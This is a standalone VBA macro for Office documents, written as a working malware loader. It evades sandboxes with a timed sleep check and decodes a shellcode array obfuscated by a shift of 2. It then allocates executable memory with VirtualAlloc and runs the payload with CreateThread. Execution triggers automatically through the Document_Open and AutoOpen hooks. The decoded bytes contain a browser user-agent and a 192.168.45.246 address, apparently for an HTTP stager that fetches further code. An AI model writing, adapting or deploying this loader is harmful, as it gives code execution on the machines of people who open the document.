Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long


Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    
    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    
    If time < 2 Then
        Exit Function
    End If

    buf = Array(254, 234, 145, 2, 2, 2, 98, 139, 231, 51, 212, 102, 141, 84, 50, 141, 84, 14, 141, 84, 22, 51, 1, 17, 185, 76, 40, 141, 116, 42, 51, 194, 174, 62, 99, 126, 4, 46, 34, 195, 209, 15, 3, 201, 75, 119, 241, 84, 89, 141, _
84, 18, 141, 68, 62, 3, 210, 141, 66, 122, 135, 194, 118, 78, 3, 210, 141, 74, 26, 141, 90, 34, 3, 213, 82, 135, 203, 118, 62, 51, 1, 75, 141, 54, 141, 3, 216, 51, 194, 195, 209, 15, 174, 3, 201, 58, 226, 119, 246, 5, _
127, 250, 61, 127, 38, 119, 226, 90, 141, 90, 38, 3, 213, 104, 141, 14, 77, 141, 90, 30, 3, 213, 141, 6, 141, 3, 210, 139, 70, 38, 38, 93, 93, 99, 91, 92, 83, 1, 226, 90, 97, 92, 141, 20, 235, 130, 1, 1, 1, 95, _
106, 112, 103, 118, 2, 106, 121, 107, 112, 107, 86, 106, 78, 121, 40, 9, 1, 215, 51, 221, 85, 85, 85, 85, 85, 234, 83, 2, 2, 2, 79, 113, 124, 107, 110, 110, 99, 49, 55, 48, 50, 34, 42, 89, 107, 112, 102, 113, 121, 117, _
34, 80, 86, 34, 51, 50, 48, 50, 61, 34, 89, 107, 112, 56, 54, 61, 34, 122, 56, 54, 61, 34, 116, 120, 60, 51, 50, 59, 48, 50, 43, 34, 73, 103, 101, 109, 113, 49, 52, 50, 51, 50, 50, 51, 50, 51, 34, 72, 107, 116, _
103, 104, 113, 122, 49, 51, 51, 54, 48, 50, 2, 106, 60, 88, 123, 169, 1, 215, 85, 85, 108, 5, 85, 85, 106, 189, 3, 2, 2, 234, 20, 3, 2, 2, 49, 53, 102, 106, 108, 113, 67, 70, 90, 121, 123, 75, 119, 115, 123, 47, _
115, 85, 53, 86, 91, 87, 105, 111, 116, 68, 84, 77, 82, 87, 82, 106, 71, 82, 55, 72, 54, 84, 106, 116, 105, 81, 87, 103, 84, 85, 123, 72, 121, 123, 84, 86, 85, 76, 84, 67, 83, 105, 112, 102, 102, 86, 108, 121, 88, 90, _
92, 119, 103, 68, 86, 119, 100, 57, 114, 99, 117, 68, 105, 112, 69, 115, 83, 83, 88, 85, 116, 120, 67, 114, 85, 67, 67, 85, 97, 55, 56, 55, 58, 82, 107, 120, 103, 86, 85, 73, 58, 50, 84, 80, 92, 116, 57, 58, 52, 113, _
76, 50, 59, 106, 123, 101, 77, 67, 76, 124, 72, 90, 52, 86, 54, 70, 120, 110, 111, 106, 67, 117, 50, 113, 115, 50, 116, 76, 59, 51, 73, 105, 87, 71, 2, 82, 106, 89, 139, 161, 200, 1, 215, 139, 200, 85, 106, 2, 4, 106, _
134, 85, 85, 85, 89, 85, 88, 106, 237, 87, 48, 61, 1, 215, 152, 108, 12, 97, 85, 85, 85, 85, 88, 106, 47, 8, 26, 125, 1, 215, 135, 194, 119, 22, 106, 138, 21, 2, 2, 106, 70, 242, 55, 226, 1, 215, 81, 119, 227, 234, _
77, 2, 2, 2, 108, 66, 106, 2, 18, 2, 2, 106, 2, 2, 66, 2, 85, 106, 90, 166, 85, 231, 1, 215, 149, 85, 85, 139, 233, 89, 106, 2, 34, 2, 2, 85, 88, 106, 20, 152, 139, 228, 1, 215, 135, 194, 118, 209, 141, 9, _
3, 197, 135, 194, 119, 231, 90, 197, 97, 234, 129, 1, 1, 1, 51, 59, 52, 48, 51, 56, 58, 48, 54, 55, 48, 52, 54, 56, 2, 189, 242, 183, 164, 88, 108, 2, 85, 1, 215)

    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i
    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
    
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub